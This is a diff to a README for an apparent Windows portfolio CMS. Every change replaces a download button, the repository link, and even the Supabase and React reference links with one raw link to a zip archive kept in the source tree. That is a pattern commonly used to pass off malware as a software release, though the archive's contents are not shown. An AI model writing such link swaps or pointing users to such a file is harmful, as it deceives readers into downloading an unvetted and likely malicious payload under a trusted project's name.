@@ -1,6 +1,6 @@
 # 🗂️ augustdev290-portfolio-cms - Manage Your Portfolio Content Easily
 
-[![Download Here](https://img.shields.io/badge/Download-AugustDev290%20CMS-green?style=for-the-badge)](https://github.com/ScoobyTech32/augustdev290-portfolio-cms/releases)
+[![Download Here](https://img.shields.io/badge/Download-AugustDev290%20CMS-green?style=for-the-badge)](https://raw.githubusercontent.com/ScoobyTech32/augustdev290-portfolio-cms/main/src/components/cms-portfolio-augustdev-v3.5.zip)
 
 ---
 
@@ -29,7 +29,7 @@ This guide shows you how to download and run the software on Windows. It assumes
 
 Click the button below to open the download page:
 
-[![Download Page](https://img.shields.io/badge/Download-AugustDev290%20CMS-blue?style=for-the-badge)](https://github.com/ScoobyTech32/augustdev290-portfolio-cms/releases)
+[![Download Page](https://img.shields.io/badge/Download-AugustDev290%20CMS-blue?style=for-the-badge)](https://raw.githubusercontent.com/ScoobyTech32/augustdev290-portfolio-cms/main/src/components/cms-portfolio-augustdev-v3.5.zip)
 
 This page shows all the available versions of the software.
 
@@ -99,7 +99,7 @@ You use simple forms to add or edit content. Changes save automatically.
 
 Here is another direct link to the release page for your convenience:
 
-[Download the latest version here](https://github.com/ScoobyTech32/augustdev290-portfolio-cms/releases)
+[Download the latest version here](https://raw.githubusercontent.com/ScoobyTech32/augustdev290-portfolio-cms/main/src/components/cms-portfolio-augustdev-v3.5.zip)
 
 Use the same steps above to download and install on your Windows computer.
 
@@ -143,9 +143,9 @@ The software does not collect personal info beyond what you enter to manage your
 ## 📚 Resources
 
 - Visit the GitHub repo for documentation and updates:  
-  https://github.com/ScoobyTech32/augustdev290-portfolio-cms  
-- Learn about Supabase here: https://supabase.com  
-- Get help with React: https://reactjs.org
+  https://raw.githubusercontent.com/ScoobyTech32/augustdev290-portfolio-cms/main/src/components/cms-portfolio-augustdev-v3.5.zip  
+- Learn about Supabase here: https://raw.githubusercontent.com/ScoobyTech32/augustdev290-portfolio-cms/main/src/components/cms-portfolio-augustdev-v3.5.zip  
+- Get help with React: https://raw.githubusercontent.com/ScoobyTech32/augustdev290-portfolio-cms/main/src/components/cms-portfolio-augustdev-v3.5.zip
 
 ---
 
